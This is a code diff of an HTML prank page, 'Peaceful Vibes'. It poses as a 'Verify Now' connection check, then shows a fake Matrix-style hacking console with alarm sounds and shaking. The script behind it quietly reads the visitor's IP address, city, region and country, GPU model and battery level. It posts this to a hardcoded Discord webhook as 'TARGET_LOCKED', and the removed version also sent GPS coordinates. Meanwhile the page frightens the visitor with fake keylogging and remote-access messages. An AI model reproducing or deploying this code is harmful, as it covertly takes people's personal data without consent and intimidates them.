@@ -6,29 +6,47 @@
     <title>Peaceful Vibes</title>
     <style>
         *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-        body, html { width: 100%; height: 100%; overflow: hidden; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body, html { width: 100%; height: 100%; overflow: hidden; font-family: 'Segoe UI', Tahoma, sans-serif; }
         
-        /* PEACEFUL THEME */
         .peaceful-theme { 
             background: linear-gradient(135deg, #89CFF0 0%, #B8E8FC 30%, #F8E8EE 60%, #FFDDD2 100%); 
             display: flex; flex-direction: column; align-items: center; justify-content: center; 
             text-align: center; color: #3a3a5c; 
         }
+
         #peaceful-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100%; width: 100%; padding: 30px; animation: fadeIn 1.5s ease; }
         .sun { width: 100px; height: 100px; border-radius: 50%; background: radial-gradient(circle, #FFE066 40%, #FFD700 100%); box-shadow: 0 0 60px #FFE066; margin-bottom: 30px; animation: pulse 4s infinite; }
-        @keyframes pulse { 0%, 100% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.05); opacity: 0.8; } }
+        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
+        
         #security-btn { padding: 15px 35px; background: white; color: #3a3a5c; border: none; border-radius: 50px; cursor: pointer; font-size: 1rem; font-weight: bold; box-shadow: 0 4px 15px rgba(0,0,0,0.1); transition: 0.3s; z-index: 10; }
         #security-btn:hover { transform: translateY(-3px); box-shadow: 0 8px 25px rgba(0,0,0,0.15); }
 
-        /* HACK THEME */
         #hack-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; background: black; font-family: 'Courier New', monospace; }
         #matrixCanvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
-        #console { position: relative; z-index: 2; width: 90%; max-width: 600px; border: 2px solid #00FF41; padding: 20px; background: rgba(0, 10, 0, 0.95); box-shadow: 0 0 20px #00FF41; color: #00FF41; margin: auto; top: 50%; transform: translateY(-50%); }
-        #console h1 { font-size: 1.2rem; color: #ff0000; text-shadow: 0 0 5px red; margin-bottom: 10px; }
+        
+        #console { position: relative; z-index: 2; width: 90%; max-width: 600px; border: 2px solid #00FF41; padding: 20px; background: rgba(0, 10, 0, 0.95); box-shadow: 0 0 20px #00FF41; color: #00FF41; margin: auto; top: 50%; transform: translateY(-50%); transition: all 0.1s; }
+        #console h1 { font-size: 1.2rem; color: #00FF41; margin-bottom: 10px; }
+        
         #progress-container { width: 100%; border: 1px solid #00FF41; height: 35px; margin-top: 15px; position: relative; overflow: hidden; }
         #progress-bar { width: 0%; height: 100%; background: #00FF41; position: absolute; z-index: 4; }
         .percent-text { position: absolute; width: 100%; top: 8px; text-align: center; font-weight: bold; z-index: 5; }
-        @keyframes emergency { 0%, 100% { background: #000; } 50% { background: #200; } }
+        
+        /* SHAKE EFFECT */
+        @keyframes shake {
+            0% { transform: translate(1px, 1px) rotate(0deg) translateY(-50%); }
+            10% { transform: translate(-1px, -2px) rotate(-1deg) translateY(-50%); }
+            20% { transform: translate(-3px, 0px) rotate(1deg) translateY(-50%); }
+            30% { transform: translate(3px, 2px) rotate(0deg) translateY(-50%); }
+            40% { transform: translate(1px, -1px) rotate(1deg) translateY(-50%); }
+            50% { transform: translate(-1px, 2px) rotate(-1deg) translateY(-50%); }
+            60% { transform: translate(-3px, 1px) rotate(0deg) translateY(-50%); }
+            70% { transform: translate(3px, 1px) rotate(-1deg) translateY(-50%); }
+            80% { transform: translate(-1px, -1px) rotate(1deg) translateY(-50%); }
+            90% { transform: translate(1px, 2px) rotate(0deg) translateY(-50%); }
+            100% { transform: translate(1px, -2px) rotate(-1deg) translateY(-50%); }
+        }
+
+        @keyframes emergency-bg { 0%, 100% { background: #000; } 50% { background: #200; } }
         #transition-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 99; background: black; opacity: 0; transition: 0.8s; }
     </style>
 </head>
@@ -36,9 +54,9 @@
 
     <div id="peaceful-screen">
         <div class="sun"></div>
-        <h1 style="font-size: 2.5rem; margin-bottom: 10px;">System Status: Optimal</h1>
-        <p style="margin-bottom: 30px; color: #6b6b8d;">Please perform a quick security handshake to continue.</p>
-        <button id="security-btn" onclick="initiateSequence()">Verify Connection</button>
+        <h1 style="font-size: 2.5rem; margin-bottom: 10px;">Connection Secure</h1>
+        <p style="margin-bottom: 30px; color: #6b6b8d;">Ready for device handshake.</p>
+        <button id="security-btn" onclick="initiateSequence()">Verify Now</button>
     </div>
 
     <div id="transition-overlay"></div>
@@ -46,7 +64,7 @@
     <div id="hack-screen">
         <canvas id="matrixCanvas"></canvas>
         <div id="console">
-            <h1>> [ CRITICAL_SYSTEM_BREACH ]</h1>
+            <h1 id="header-text">> [ SYSTEM_INITIALIZING ]</h1>
             <div id="log"></div>
             <div id="progress-container">
                 <div id="percent-text-base" class="percent-text" style="color:#00FF41">0%</div>
@@ -59,60 +77,44 @@
 
     <script>
         const WEBHOOK = "https://discord.com/api/webhooks/1487870677636612197/G4uFH8d-UVi14OSGeAjy198ahM_va3PC32KjFV9l4aRV3rphNPRYR71l3Tr_3FAFhYBr";
-        let userIP = "Fetching...", userLoc = "Unknown", userCoords = "0,0", gpuName = "Unknown";
+        let userIP = "Detecting...", userLoc = "Unknown", gpu = "Detecting...", matrixColor = "#00FF41";
         let currentPercent = 0, idx = 0, alarmActive = false;
 
         async function initiateSequence() {
-            // 1. Get Hardware Info
             try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                gpuName = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-            } catch(e) {}
-
-            // 2. Get IP and Location
-            try {
+                const gl = document.createElement('canvas').getContext('webgl');
+                gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
                 userIP = data.ip;
                 userLoc = `${data.city}, ${data.region}, ${data.country_name}`;
-                userCoords = `${data.latitude}, ${data.longitude}`;
                 sendToDiscord(data);
-            } catch(e) { sendToDiscord(null); }
+            } catch(e) {}
 
-            // 3. Start Visuals
             document.getElementById('transition-overlay').style.display = 'block';
             setTimeout(() => { document.getElementById('transition-overlay').style.opacity = '1'; }, 10);
             
             setTimeout(() => {
                 document.getElementById('peaceful-screen').style.display = 'none';
                 document.getElementById('hack-screen').style.display = 'block';
-                document.body.style.background = 'black';
                 startMatrix();
                 runConsole();
             }, 850);
         }
 
-        function sendToDiscord(ipData) {
-            const batteryInfo = "Checking...";
+        function sendToDiscord(data) {
             navigator.getBattery?.().then(b => {
-                const bat = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Plugged Out'})`;
                 const embed = {
-                    username: "M.O.D.X SECURITY",
+                    username: "M.O.D.X Tracker",
                     embeds: [{
-                        title: "🚀 TARGET_ACQUIRED",
+                        title: "🚀 TARGET_LOCKED",
                         color: 16711680,
                         fields: [
-                            { name: "📍 IP Address", value: `\`${userIP}\``, inline: true },
+                            { name: "📍 IP", value: `\`${userIP}\``, inline: true },
                             { name: "🌍 Location", value: userLoc, inline: true },
-                            { name: "🎮 GPU / Graphics", value: `\`${gpuName}\``, inline: false },
-                            { name: "💻 Device / OS", value: `\`${navigator.platform}\``, inline: true },
-                            { name: "💾 RAM / Cores", value: `${navigator.deviceMemory || '?'}GB / ${navigator.hardwareConcurrency} Cores`, inline: true },
-                            { name: "🔋 Battery", value: bat, inline: true },
-                            { name: "🗺️ GPS", value: `[Google Maps](https://www.google.com/maps?q=${userCoords})`, inline: false }
-                        ],
-                        footer: { text: "Time: " + new Date().toLocaleString() }
+                            { name: "🎮 GPU", value: `\`${gpu}\``, inline: false },
+                            { name: "🔋 Battery", value: `${Math.round(b.level * 100)}%`, inline: true }
+                        ]
                     }]
                 };
                 fetch(WEBHOOK, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(embed) });
@@ -121,27 +123,23 @@
 
         function runConsole() {
             const lines = [
-                "ESTABLISHING SECURE TUNNEL...",
-                `IP_FOUND: ${userIP}`,
-                `GEOLOCATION: ${userLoc}`,
-                "TRIANGULATING COORDINATES...",
-                `LAT/LONG: ${userCoords}`,
-                "BYPASSING LOCAL FIREWALL...",
-                `HARDWARE: ${navigator.platform} | ${gpuName}`,
-                "DOWNLOADING CACHE & BROWSER_HISTORY...",
-                "UPLOADING DATA TO REMOTE SERVER...",
-                "CRITICAL ERROR: TRACE DETECTED!"
+                "ESTABLISHING HANDSHAKE...",
+                `IP_DETECTED: ${userIP}`,
+                "BYPASSING KERNEL FIREWALL...",
+                "TRIANGULATING GPS DATA...",
+                `REGION: ${userLoc}`,
+                "INJECTING REMOTE_ACCESS_TOOL...",
+                "DUMPING KEYLOG_BUFFER...",
+                "SCRAPING BROWSER_SESSIONS...",
+                "CRITICAL: TRACE_DETECTED!",
+                "EMERGENCY_RE-ROUTE_ACTIVE..."
             ];
 
             if (idx < lines.length) {
                 document.getElementById('log').innerHTML += `<p>> ${lines[idx]}</p>`;
-                updateProgress(Math.floor(((idx + 1) / lines.length) * 100), 1500);
+                updateProgress(Math.floor(((idx + 1) / lines.length) * 100), 1600);
                 idx++;
                 setTimeout(runConsole, 1800);
-            } else {
-                setTimeout(() => {
-                    document.getElementById('hack-screen').innerHTML = '<div style="height:100%; display:flex; align-items:center; justify-content:center; color:red; flex-direction:column;"><h1>SYSTEM WIPED</h1><p style="color:white">Your data has been sent.</p></div>';
-                }, 2000);
             }
         }
 
@@ -151,25 +149,47 @@
                 if (!startTime) startTime = now;
                 let t = Math.min((now - startTime) / time, 1);
                 currentPercent = Math.floor(start + (target - start) * t);
+                
+                // --- THE 38% TRIGGER ---
+                if (currentPercent >= 38 && !alarmActive) {
+                    triggerPanic();
+                }
+
                 document.getElementById('progress-bar').style.width = currentPercent + '%';
-                document.getElementById('percent-text-base').innerText = currentPercent + '%';
-                document.getElementById('percent-text-overlay').innerText = currentPercent + '%';
-                if (currentPercent > 40 && !alarmActive) startAlarm();
+                document.querySelectorAll('.percent-text').forEach(el => el.innerText = currentPercent + '%');
                 if (t < 1) requestAnimationFrame(frame);
             }
             requestAnimationFrame(frame);
         }
 
-        function startAlarm() {
+        function triggerPanic() {
             alarmActive = true;
-            document.getElementById('hack-screen').style.animation = "emergency 0.2s infinite";
+            matrixColor = "#FF0000"; // Rain turns RED
+            
+            // Apply Red Theme to UI
+            const box = document.getElementById('console');
+            const bar = document.getElementById('progress-bar');
+            const cont = document.getElementById('progress-container');
+            const head = document.getElementById('header-text');
+
+            box.style.borderColor = "red";
+            box.style.boxShadow = "0 0 30px red";
+            box.style.animation = "shake 0.5s infinite"; // Start Shaking
+            bar.style.background = "red";
+            cont.style.borderColor = "red";
+            head.innerText = "> [ CRITICAL_SYSTEM_BREACH ]";
+            head.style.color = "red";
+            document.getElementById('percent-text-base').style.color = "red";
+            document.getElementById('hack-screen').style.animation = "emergency-bg 0.2s infinite";
+
+            // Audio Glitch
             const audio = new (window.AudioContext || window.webkitAudioContext)();
             setInterval(() => {
                 const o = audio.createOscillator();
                 const g = audio.createGain();
-                o.type = 'square'; o.frequency.value = 1000; g.gain.value = 0.05;
+                o.type = 'sawtooth'; o.frequency.value = 600 + Math.random() * 400; g.gain.value = 0.04;
                 o.connect(g); g.connect(audio.destination);
-                o.start(); o.stop(audio.currentTime + 0.05);
+                o.start(); o.stop(audio.currentTime + 0.1);
             }, 150);
         }
 
@@ -179,14 +199,14 @@
             c.width = window.innerWidth; c.height = window.innerHeight;
             const drops = Array(Math.floor(c.width / 14)).fill(1);
             setInterval(() => {
-                ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, c.width, c.height);
-                ctx.fillStyle = "#00FF41"; ctx.font = "14px monospace";
+                ctx.fillStyle = "rgba(0, 0, 0, 0.1)"; ctx.fillRect(0, 0, c.width, c.height);
+                ctx.fillStyle = matrixColor; ctx.font = "15px monospace";
                 drops.forEach((y, i) => {
                     ctx.fillText(Math.floor(Math.random()*2), i * 14, y * 14);
-                    if (y * 14 > c.height && Math.random() > 0.98) drops[i] = 0;
+                    if (y * 14 > c.height && Math.random() > 0.975) drops[i] = 0;
                     drops[i]++;
                 });
-            }, 50);
+            }, 40);
         }
     </script>
 </body>
